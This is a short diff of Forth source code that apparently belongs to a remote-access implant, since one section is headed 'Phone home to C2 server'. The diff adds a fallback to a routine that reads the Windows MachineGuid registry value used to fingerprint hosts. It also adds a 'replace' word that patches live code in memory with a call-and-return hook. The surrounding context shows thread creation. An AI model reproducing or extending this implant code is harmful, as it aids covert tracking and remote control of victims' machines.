@@ -306,9 +306,13 @@ public{
 }public
 
 : machineguid ( -- addr u )
-  HKLM s" Software\\Microsoft\\Cryptography" regopen
-  dup s" MachineGuid" regread
-  rot regclose ;
+  HKLM s" Software\\Microsoft\\Cryptography" regopen dup if
+    dup s" MachineGuid" regread
+    rot regclose 
+  else
+    s" deadbeef"
+  then
+;
 
 \ ------------------------------------------------------------------------
 \ View environment variables
@@ -786,6 +790,17 @@ public{
   >r 0 0 rot 24 + r> 0 here CreateThread ;
 
 : consume  begin key? while key drop repeat ;
+
+hex
+: replace        ( xt name len )
+  lookup >xt     ( xt addr )
+  e8 over c! 1+  ( xt addr )
+  swap over      ( addr xt addr )
+  - 4 -          ( addr delta )
+  over d!        ( addr )
+  4 + c3 swap c! ( )
+;
+dec
 
 \ ------------------------------------------------------------------------
 \ Phone home to C2 server with new outer interpreter
